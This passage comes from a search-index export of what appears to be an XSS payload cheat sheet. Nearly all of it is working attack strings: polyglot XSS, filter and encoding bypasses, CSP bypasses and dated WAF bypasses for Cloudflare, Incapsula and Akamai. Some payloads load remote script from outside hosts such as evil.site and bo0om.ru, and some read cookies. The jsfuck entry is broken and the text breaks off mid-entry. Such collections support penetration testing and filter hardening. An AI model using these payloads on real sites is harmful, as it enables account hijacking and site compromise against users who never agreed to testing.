fromCharCode(88,83,83))//\";alert(String.fromCharCode (88,83,83))//\";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;\n</code></pre> <p>Polyglot XSS - Daniel Miessler</p> <pre><code>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;\n\u201c onclick=alert(1)//&lt;button \u2018 onclick=alert(1)//&gt; */ alert(1)//\n'\"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;\"&gt;&lt;/plaintext\\&gt;&lt;/|\\&gt;&lt;plaintext/onmouseover=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;\"&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;&lt;img/id=\"confirm&amp;lpar;1)\"/alt=\"/\"src=\"/\"onerror=eval(id&amp;%23x29;&gt;'\"&gt;&lt;img src=\"http://i.imgur.com/P8mL8.jpg\"&gt;\njavascript://'/&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;--&gt;&lt;p\" onclick=alert()//&gt;*/alert()/*\njavascript://--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;\"/&lt;/textarea&gt;*/&lt;alert()/*' onclick=alert()//&gt;a\njavascript://&lt;/title&gt;\"/&lt;/script&gt;&lt;/style&gt;&lt;/textarea/--&gt;*/&lt;alert()/*' onclick=alert()//&gt;/\njavascript://&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;--&gt;&lt;/script&gt;&lt;a\"//' onclick=alert()//&gt;*/alert()/*\njavascript://'//\" --&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script&gt;&lt;/title&gt;&lt;b onclick= alert()//&gt;*/alert()/*\njavascript://&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/script --&gt;&lt;li '//\" '*/alert()/*', onclick=alert()//\njavascript:alert()//--&gt;&lt;/script&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/title&gt;&lt;a\"//' onclick=alert()//&gt;*/alert()/*\n--&gt;&lt;/script&gt;&lt;/title&gt;&lt;/style&gt;\"/&lt;/textarea&gt;&lt;a' onclick=alert()//&gt;*/alert()/*\n/&lt;/title/'/&lt;/style/&lt;/script/&lt;/textarea/--&gt;&lt;p\" onclick=alert()//&gt;*/alert()/*\njavascript://--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;svg \"//' onclick=alert()//\n/&lt;/title/'/&lt;/style/&lt;/script/--&gt;&lt;p\" onclick=alert()//&gt;*/alert()/*\n</code></pre> <p>Polyglot XSS - @s0md3v </p> <pre><code>--&gt;'\"/&gt;&lt;/sCript&gt;&lt;svG x=\"&gt;\" onload=(co\\u006efirm)``&gt;\n</code></pre> <p></p> <pre><code>&lt;svg%0Ao%00nload=%09((pro\\u006dpt))()//\n</code></pre> <p>Polyglot XSS - from @filedescriptor's Polyglot Challenge</p> <pre><code># by crlf\njavascript:\"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \\\" onmouseover=/*&amp;lt;svg/*/onload=alert()//&gt;\n# by europa\njavascript:\"/*'/*`/*\\\" /*&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/script/--&gt;&amp;lt;svg/onload=/*&lt;html/*/onmouseover=alert()//&gt;\n# by EdOverflow\njavascript:\"/*\\\"/*`/*' /*&lt;/template&gt;&lt;/textarea&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/style&gt;&lt;/script&gt;--&gt;&amp;lt;svg onload=/*&lt;html/*/onmouseover=alert()//&gt;\n# by h1/ragnar\njavascript:`//\"//\\\"//&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;/template&gt;&amp;lt;svg/onload='/*--&gt;&lt;html */ onmouseover=alert()//'&gt;`\n</code></pre> <p>Polyglot XSS - from brutelogic <pre><code>JavaScript://%250Aalert?.(1)//'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*&lt;!--&gt;&lt;/Title/&lt;/Style/&lt;/Script/&lt;/textArea/&lt;/iFrame/&lt;/noScript&gt;\\74k&lt;K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//&gt;&lt;Base/Href=//X55.is\\76--&gt;\n</code></pre></p>"},{"location":"XSS%20Injection/#filter-bypass-and-exotic-payloads","title":"Filter Bypass and exotic payloads","text":""},{"location":"XSS%20Injection/#bypass-case-sensitive","title":"Bypass case sensitive","text":"<pre><code>&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-tag-blacklist","title":"Bypass tag blacklist","text":"<pre><code>&lt;script x&gt;\n&lt;script x&gt;alert('XSS')&lt;script y&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-word-blacklist-with-code-evaluation","title":"Bypass word blacklist with code evaluation","text":"<pre><code>eval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-with-incomplete-html-tag","title":"Bypass with incomplete html tag","text":"<p>Works on IE/Firefox/Chrome/Safari</p> <pre><code>&lt;img src='1' onerror='alert(0)' &lt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-quotes-for-string","title":"Bypass quotes for string","text":"<pre><code>String.fromCharCode(88,83,83)\n</code></pre>"},{"location":"XSS%20Injection/#bypass-quotes-in-script-tag","title":"Bypass quotes in script tag","text":"<pre><code>http://localhost/bla.php?test=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\n&lt;html&gt;\n&lt;script&gt;\n&lt;?php echo 'foo=\"text '.$_GET['test'].'\";';`?&gt;\n  &lt;/script&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-quotes-in-mousedown-event","title":"Bypass quotes in mousedown event","text":"<p>You can bypass a single quote with ' in an on mousedown event handler</p> <pre><code>&lt;a href=\"\" onmousedown=\"var name = '&amp;#39;;alert(1)//'; alert('smthg')\"&gt;Link&lt;/a&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-dot-filter","title":"Bypass dot filter","text":"<pre><code>&lt;script&gt;window['alert'](document['domain'])&lt;/script&gt;\n</code></pre> <p>Convert IP address into decimal format: IE. <code>http://192.168.1.1</code> == <code>http://3232235777</code> http://www.geektools.com/cgi-bin/ipconv.cgi</p> <pre><code>&lt;script&gt;eval(atob(\"YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\"))&lt;script&gt;\n</code></pre> <p>Base64 encoding your XSS payload with Linux command: IE. <code>echo -n \"alert(document.cookie)\" | base64</code> == <code>YWxlcnQoZG9jdW1lbnQuY29va2llKQ==</code></p>"},{"location":"XSS%20Injection/#bypass-parenthesis-for-string","title":"Bypass parenthesis for string","text":"<pre><code>alert`1`\nsetTimeout`alert\\u0028document.domain\\u0029`;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-parenthesis-and-semi-colon","title":"Bypass parenthesis and semi colon","text":"<pre><code>// From @garethheyes\n&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;\n&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;\n&lt;script&gt;throw onerror=alert,'some string',123,'haha'&lt;/script&gt;\n// From @terjanq\n&lt;script&gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]&lt;/script&gt;\n// From @cgvwzq\n&lt;script&gt;TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']&lt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-onxxxx-blacklist","title":"Bypass onxxxx= blacklist","text":"<pre><code>&lt;object onafterscriptexecute=confirm(0)&gt;\n&lt;object onbeforescriptexecute=confirm(0)&gt;\n// Bypass onxxx= filter with a null byte/vertical tab\n&lt;img src='1' onerror\\x00=alert(0) /&gt;\n&lt;img src='1' onerror\\x0b=alert(0) /&gt;\n// Bypass onxxx= filter with a '/'\n&lt;img src='1' onerror/=alert(0) /&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-space-filter","title":"Bypass space filter","text":"<pre><code>// Bypass space filter with \"/\"\n&lt;img/src='1'/onerror=alert(0)&gt;\n// Bypass space filter with 0x0c/^L\n&lt;svg\fonload\f=\falert(1)\f&gt;\n$ echo \"&lt;svg^Lonload^L=^Lalert(1)^L&gt;\" | xxd\n00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  &lt;svg.onload.=.al\n00000010: 6572 7428 3129 0c3e 0a                   ert(1).&gt;.\n</code></pre>"},{"location":"XSS%20Injection/#bypass-email-filter","title":"Bypass email filter","text":"<p>(RFC compliant)</p> <pre><code>\"&gt;&lt;svg/onload=confirm(1)&gt;\"@x.y\n</code></pre>"},{"location":"XSS%20Injection/#bypass-document-blacklist","title":"Bypass document blacklist","text":"<pre><code>&lt;div id = \"x\"&gt;&lt;/div&gt;&lt;script&gt;alert(x.parentNode.parentNode.parentNode.location)&lt;/script&gt;\nwindow[\"doc\"+\"ument\"]\n</code></pre>"},{"location":"XSS%20Injection/#bypass-documentcookie-blacklist","title":"Bypass document.cookie blacklist","text":"<p>This is another way to access cookies on Chrome, Edge, and Opera. Replace COOKIE NAME with the cookie you are after. You may also investigate the getAll() method if that suits your requirements.</p> <pre><code>window.cookieStore.get('COOKIE NAME').then((cookieValue)=&gt;{alert(cookieValue.value);});\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-javascript-inside-a-string","title":"Bypass using javascript inside a string","text":"<pre><code>&lt;script&gt;\nfoo=\"text &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;\";\n&lt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-an-alternate-way-to-redirect","title":"Bypass using an alternate way to redirect","text":"<pre><code>location=\"http://google.com\"\ndocument.location = \"http://google.com\"\ndocument.location.href=\"http://google.com\"\nwindow.location.assign(\"http://google.com\")\nwindow['location']['href']=\"http://google.com\"\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-an-alternate-way-to-execute-an-alert","title":"Bypass using an alternate way to execute an alert","text":"<p>From @brutelogic tweet.</p> <pre><code>window['alert'](0)\nparent['alert'](1)\nself['alert'](2)\ntop['alert'](3)\nthis['alert'](4)\nframes['alert'](5)\ncontent['alert'](6)\n[7].map(alert)\n[8].find(alert)\n[9].every(alert)\n[10].filter(alert)\n[11].findIndex(alert)\n[12].forEach(alert);\n</code></pre> <p>From @theMiddle - Using global variables</p> <p>The Object.keys() method returns an array of a given object's own property names, in the same order as we get with a normal loop. That's means that we can access any JavaScript function by using its index number instead the function name.</p> <pre><code>c=0; for(i in self) { if(i == \"alert\") { console.log(c); } c++; }\n// 5\n</code></pre> <p>Then calling alert is :</p> <pre><code>Object.keys(self)[5]\n// \"alert\"\nself[Object.keys(self)[5]](\"1\") // alert(\"1\")\n</code></pre> <p>We can find \"alert\" with a regular expression like ^a[rel]+t$ :</p> <pre><code>a=()=&gt;{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //bind function alert on new function a()\n// then you can use a() with Object.keys\nself[Object.keys(self)[a()]](\"1\") // alert(\"1\")\n</code></pre> <p>Oneliner: <pre><code>a=()=&gt;{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]](\"1\")\n</code></pre></p> <p>From @quanyang tweet.</p> <pre><code>prompt`${document.domain}`\ndocument.location='java\\tscript:alert(1)'\ndocument.location='java\\rscript:alert(1)'\ndocument.location='java\\tscript:alert(1)'\n</code></pre> <p>From @404death tweet.</p> <pre><code>eval('ale'+'rt(0)');\nFunction(\"ale\"+\"rt(1)\")();\nnew Function`al\\ert\\`6\\``;\nconstructor.constructor(\"aler\"+\"t(3)\")();\n[].filter.constructor('ale'+'rt(4)')();\ntop[\"al\"+\"ert\"](5);\ntop[8680439..toString(30)](7);\ntop[/al/.source+/ert/.source](8);\ntop['al\\x65rt'](9);\nopen('java'+'script:ale'+'rt(11)');\nlocation='javascript:ale'+'rt(12)';\nsetTimeout`alert\\u0028document.domain\\u0029`;\nsetTimeout('ale'+'rt(2)');\nsetInterval('ale'+'rt(10)');\nSet.constructor('ale'+'rt(13)')();\nSet.constructor`al\\x65rt\\x2814\\x29```;\n</code></pre> <p>Bypass using an alternate way to trigger an alert</p> <pre><code>var i = document.createElement(\"iframe\");\ni.onload = function(){\ni.contentWindow.alert(1);\n}\ndocument.appendChild(i);\n// Bypassed security\nXSSObject.proxy = function (obj, name, report_function_name, exec_original) {\nvar proxy = obj[name];\nobj[name] = function () {\nif (exec_original) {\nreturn proxy.apply(this, arguments);\n}\n};\nXSSObject.lockdown(obj, name);\n};\nXSSObject.proxy(window, 'alert', 'window.alert', false);\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-nothing","title":"Bypass \"&gt;\" using nothing","text":"<p>You don't need to close your tags.</p> <pre><code>&lt;svg onload=alert(1)//\n</code></pre>"},{"location":"XSS%20Injection/#bypass-and-using-and","title":"Bypass \"&lt;\" and \"&gt;\" using \uff1c and \uff1e","text":"<p>Unicode Character U+FF1C and U+FF1E</p> <pre><code>\uff1cscript/src=//evil.site/poc.js\uff1e\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-another-character","title":"Bypass \";\" using another character","text":"<pre><code>'te' * alert('*') * 'xt';\n'te' / alert('/') / 'xt';\n'te' % alert('%') % 'xt';\n'te' - alert('-') - 'xt';\n'te' + alert('+') + 'xt';\n'te' ^ alert('^') ^ 'xt';\n'te' &gt; alert('&gt;') &gt; 'xt';\n'te' &lt; alert('&lt;') &lt; 'xt';\n'te' == alert('==') == 'xt';\n'te' &amp; alert('&amp;') &amp; 'xt';\n'te' , alert(',') , 'xt';\n'te' | alert('|') | 'xt';\n'te' ? alert('ifelsesh') : 'xt';\n'te' in alert('in') in 'xt';\n'te' instanceof alert('instanceof') instanceof 'xt';\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-html-encoding","title":"Bypass using HTML encoding","text":"<pre><code>%26%2397;lert(1)\n&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;\n&gt;&lt;/script&gt;&lt;svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-katana","title":"Bypass using Katana","text":"<p>Using the Katakana library.</p> <pre><code>javascript:([,\u30a6,,,,\u30a2]=[]+{},[\u30cd,\u30db,\u30cc,\u30bb,,\u30df,\u30cf,\u30d8,,,\u30ca]=[!!\u30a6]+!\u30a6+\u30a6.\u30a6)[\u30c4=\u30a2+\u30a6+\u30ca+\u30d8+\u30cd+\u30db+\u30cc+\u30a2+\u30cd+\u30a6+\u30db][\u30c4](\u30df+\u30cf+\u30bb+\u30db+\u30cd+'(-~\u30a6)')()\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-cuneiform","title":"Bypass using Cuneiform","text":"<pre><code>\ud808\udc00='',\ud808\ude7a=!\ud808\udc00+\ud808\udc00,\ud808\udc03=!\ud808\ude7a+\ud808\udc00,\ud808\uddfa=\ud808\udc00+{},\ud808\udf10=\ud808\ude7a[\ud808\udc00++],\n\ud808\udc1f=\ud808\ude7a[\ud808\ude2b=\ud808\udc00],\ud808\udc06=++\ud808\ude2b+\ud808\udc00,\ud808\udc79=\ud808\uddfa[\ud808\ude2b+\ud808\udc06],\ud808\ude7a[\ud808\udc79+=\ud808\uddfa[\ud808\udc00]\n+(\ud808\ude7a.\ud808\udc03+\ud808\uddfa)[\ud808\udc00]+\ud808\udc03[\ud808\udc06]+\ud808\udf10+\ud808\udc1f+\ud808\ude7a[\ud808\ude2b]+\ud808\udc79+\ud808\udf10+\ud808\uddfa[\ud808\udc00]\n+\ud808\udc1f][\ud808\udc79](\ud808\udc03[\ud808\udc00]+\ud808\udc03[\ud808\ude2b]+\ud808\ude7a[\ud808\udc06]+\ud808\udc1f+\ud808\udf10+\"(\ud808\udc00)\")()\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-lontara","title":"Bypass using Lontara","text":"<pre><code>\u1a06='',\u1a0a=!\u1a06+\u1a06,\u1a0e=!\u1a0a+\u1a06,\u1a02=\u1a06+{},\u1a07=\u1a0a[\u1a06++],\u1a0b=\u1a0a[\u1a0f=\u1a06],\u1a03=++\u1a0f+\u1a06,\u1a05=\u1a02[\u1a0f+\u1a03],\u1a0a[\u1a05+=\u1a02[\u1a06]+(\u1a0a.\u1a0e+\u1a02)[\u1a06]+\u1a0e[\u1a03]+\u1a07+\u1a0b+\u1a0a[\u1a0f]+\u1a05+\u1a07+\u1a02[\u1a06]+\u1a0b][\u1a05](\u1a0e[\u1a06]+\u1a0e[\u1a0f]+\u1a0a[\u1a03]+\u1a0b+\u1a07+\"(\u1a06)\")()\n</code></pre> <p>More alphabets on http://aem1k.com/aurebesh.js/#</p>"},{"location":"XSS%20Injection/#bypass-using-ecmascript6","title":"Bypass using ECMAScript6","text":"<pre><code>&lt;script&gt;alert&amp;DiacriticalGrave;1&amp;DiacriticalGrave;&lt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-octal-encoding","title":"Bypass using Octal encoding","text":"<pre><code>javascript:'\\74\\163\\166\\147\\40\\157\\156\\154\\157\\141\\144\\75\\141\\154\\145\\162\\164\\50\\61\\51\\76'\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-unicode","title":"Bypass using Unicode","text":"<pre><code>Unicode character U+FF1C FULLWIDTH LESS\u00adTHAN SIGN (encoded as %EF%BC%9C) was\ntransformed into U+003C LESS\u00adTHAN SIGN (&lt;)\nUnicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was\ntransformed into U+0022 QUOTATION MARK (\")\nUnicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was\ntransformed into U+0027 APOSTROPHE (')\nE.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/\n%EF%BC%9E becomes &gt;\n%EF%BC%9C becomes &lt;\n</code></pre> <p>Bypass using Unicode converted to uppercase</p> <pre><code>\u0130 (%c4%b0).toLowerCase() =&gt; i\n\u0131 (%c4%b1).toUpperCase() =&gt; I\n\u017f (%c5%bf) .toUpperCase() =&gt; S\n\u212a (%E2%84%AA).toLowerCase() =&gt; k\n&lt;\u017fvg onload=... &gt; become &lt;SVG ONLOAD=...&gt;\n&lt;\u0131frame id=x onload=&gt;.toUpperCase() become &lt;IFRAME ID=X ONLOAD=&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-utf-7","title":"Bypass using UTF-7","text":"<pre><code>+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-utf-8","title":"Bypass using UTF-8","text":"<pre><code>&lt; = %C0%BC = %E0%80%BC = %F0%80%80%BC\n&gt; = %C0%BE = %E0%80%BE = %F0%80%80%BE\n' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7\n\" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2\n\" = %CA%BA\n' = %CA%B9\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-utf-16be","title":"Bypass using UTF-16be","text":"<pre><code>%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00\n\\x00&lt;\\x00s\\x00v\\x00g\\x00/\\x00o\\x00n\\x00l\\x00o\\x00a\\x00d\\x00=\\x00a\\x00l\\x00e\\x00r\\x00t\\x00(\\x00)\\x00&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-utf-32","title":"Bypass using UTF-32","text":"<pre><code>%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-bom","title":"Bypass using BOM","text":"<p>Byte Order Mark (The page must begin with the BOM character.) BOM character allows you to override charset of the page</p> <pre><code>BOM Character for UTF-16 Encoding:\nBig Endian : 0xFE 0xFF\nLittle Endian : 0xFF 0xFE\nXSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E\nBOM Character for UTF-32 Encoding:\nBig Endian : 0x00 0x00 0xFE 0xFF\nLittle Endian : 0xFF 0xFE 0x00 0x00\nXSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-weird-encoding-or-native-interpretation","title":"Bypass using weird encoding or native interpretation","text":"<pre><code>&lt;script&gt;\\u0061\\u006C\\u0065\\u0072\\u0074(1)&lt;/script&gt;\n&lt;img src=\"1\" onerror=\"&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;\" /&gt;\n&lt;iframe src=\"javascript:%61%6c%65%72%74%28%31%29\"&gt;&lt;/iframe&gt;\n&lt;script&gt;$=~[];$={___:++$,$$$$:(![]+\"\")[$],__$:++$,$_$_:(![]+\"\")[$],_$_:++$,$_$$:({}+\"\")[$],$$_$:($[$]+\"\")[$],_$$:++$,$$$_:(!\"\"+\"\")[$],$__:++$,$_$:++$,$$__:({}+\"\")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+\"\")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+\"\")[$.__$])+((!$)+\"\")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!\"\"+\"\")[$.__$])+($._=(!\"\"+\"\")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!\"\"+\"\")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+\"\\\"\"+$.$_$_+(![]+\"\")[$._$_]+$.$$$_+\"\\\\\"+$.__$+$.$$_+$._$_+$.__+\"(\"+$.___+\")\"+\"\\\"\")())();&lt;/script&gt;\n&lt;script&gtlt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-using-jsfuck","title":"Bypass using jsfuck","text":"<p>Bypass using jsfuck</p> <pre><coden</code></pre>"},{"location":"XSS%20Injection/#csp-bypass","title":"CSP Bypass","text":"<p>Check the CSP on https://csp-evaluator.withgoogle.com and the post : How to use Google\u2019s CSP Evaluator to bypass CSP</p>"},{"location":"XSS%20Injection/#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27","title":"Bypass CSP using JSONP from Google (Trick by @apfeifer27)","text":"<p>//google.com/complete/search?client=chrome&amp;jsonp=alert(1);</p> <pre><code>&lt;script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);&gt;\"\n</code></pre> <p>More JSONP endpoints: * /Intruders/jsonp_endpoint.txt * JSONBee/jsonp.txt</p>"},{"location":"XSS%20Injection/#bypass-csp-by-labwallarmcom","title":"Bypass CSP by lab.wallarm.com","text":"<p>Works for CSP like <code>Content-Security-Policy: default-src 'self' 'unsafe-inline';</code>, POC here</p> <pre><code>script=document.createElement('script');\nscript.src='//bo0om.ru/csp.js';\nwindow.frames[0].document.head.appendChild(script);\n</code></pre>"},{"location":"XSS%20Injection/#bypass-csp-by-rhynorater","title":"Bypass CSP by Rhynorater","text":"<pre><code>// CSP Bypass with Inline and Eval\nd=document;f=d.createElement(\"iframe\");f.src=d.querySelector('link[href*=\".css\"]').href;d.body.append(f);s=d.createElement(\"script\");s.src=\"https://[YOUR_XSSHUNTER_USERNAME].xss.ht\";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)\n</code></pre>"},{"location":"XSS%20Injection/#bypass-csp-by-akita_zen","title":"Bypass CSP by @akita_zen","text":"<p>Works for CSP like <code>script-src self</code></p> <pre><code>&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt;&lt;/object&gt;\n</code></pre>"},{"location":"XSS%20Injection/#bypass-csp-by-404death","title":"Bypass CSP by @404death","text":"<p>Works for CSP like <code>script-src 'self' data:</code> as warned about in the official mozilla documentation.</p> <pre><code>&lt;script src=\"data:,alert(1)\"&gt;/&lt;/script&gt;\n</code></pre>"},{"location":"XSS%20Injection/#common-waf-bypass","title":"Common WAF Bypass","text":""},{"location":"XSS%20Injection/#cloudflare-xss-bypasses-by-bohdan-korzhynskyi","title":"Cloudflare XSS Bypasses by @Bohdan Korzhynskyi","text":""},{"location":"XSS%20Injection/#25st-january-2021","title":"25st January 2021","text":"<pre><code>&lt;svg/onrandom=random onload=confirm(1)&gt;\n&lt;video onnull=null onmouseover=confirm(1)&gt;\n</code></pre>"},{"location":"XSS%20Injection/#21st-april-2020","title":"21st April 2020","text":"<pre><code>&lt;svg/OnLoad=\"`${prompt``}`\"&gt;\n</code></pre>"},{"location":"XSS%20Injection/#22nd-august-2019","title":"22nd August 2019","text":"<pre><code>&lt;svg/onload=%26nbsp;alert`bohdan`+\n</code></pre>"},{"location":"XSS%20Injection/#5th-june-2019","title":"5th June 2019","text":"<pre><code>1'\"&gt;&lt;img/src/onerror=.1|alert``&gt;\n</code></pre>"},{"location":"XSS%20Injection/#3rd-june-2019","title":"3rd June 2019","text":"<pre><code>&lt;svg onload=prompt%26%230000000040document.domain)&gt;\n&lt;svg onload=prompt%26%23x000000028;document.domain)&gt;\nxss'\"&gt;&lt;iframe srcdoc='%26lt;script&gt;;prompt`${document.domain}`%26lt;/script&gt;'&gt;\n</code></pre>"},{"location":"XSS%20Injection/#cloudflare-xss-bypass-22nd-march-2019-by-rakeshmane10","title":"Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)","text":"<pre><code>&lt;svg/onload=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#00116&amp;#40&amp;#41&amp;#x2f&amp;#x2f\n</code></pre>"},{"location":"XSS%20Injection/#cloudflare-xss-bypass-27th-february-2018","title":"Cloudflare XSS Bypass - 27th February 2018","text":"<pre><code>&lt;a href=\"j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;NewLine;ri&amp;Tab;pt&amp;colon;&amp;lpar;a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;(document.domain)&amp;rpar;\"&gt;X&lt;/a&gt;\n</code></pre>"},{"location":"XSS%20Injection/#chrome-auditor-9th-august-2018","title":"Chrome Auditor - 9th August 2018","text":"<pre><code>&lt;/script&gt;&lt;svg&gt;&lt;script&gt;alert(1)-%26apos%3B\n</code></pre> <p>Live example by @brutelogic - https://brutelogic.com.br/xss.php</p>"},{"location":"XSS%20Injection/#incapsula-waf-bypass-by-alra3ees-8th-march-2018","title":"Incapsula WAF Bypass by @Alra3ees- 8th March 2018","text":"<pre><code>anythinglr00&lt;/script&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;uxldz\nanythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz\n</code></pre>"},{"location":"XSS%20Injection/#incapsula-waf-bypass-by-c0d3g33k-11th-september-2018","title":"Incapsula WAF Bypass by @c0d3G33k - 11th September 2018","text":"<pre><code>&lt;object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='&gt;&lt;/object&gt;\n</code></pre>"},{"location":"XSS%20Injection/#incapsula-waf-bypass-by-daveysec-11th-may-2019","title":"Incapsula WAF Bypass by @daveysec - 11th May 2019","text":"<pre><code>&lt;svg onload\\r\\n=$.globalEval(\"al\"+\"ert()\");&gt;\n</code></pre>"},{"location":"XSS%20Injection/#akamai-waf-bypass-by-zseano-18th-june-2018","title":"Akamai WAF Bypass by @zseano - 18th June 2018","text":"<pre><code>?\"&gt;&lt;/script&gt;&lt;base%20c%3D=href%3Dhttps:\\mysite&gt;\n</code></pre>"},{"location":"XSS%20Injection/#akamai-waf-bypass-by-s0md3v-28th-october-2018","title":"Akamai WAF Bypass by @s0md3v - 28th October 2018","text":"<pre><code>&lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&gt;\n</code></pre>"},{"location":"XSS%20Injection/#wordfence-waf-bypass-by-brutelogic-12th-september-2018","title":"WordFence WAF Bypass by @brutelogic - 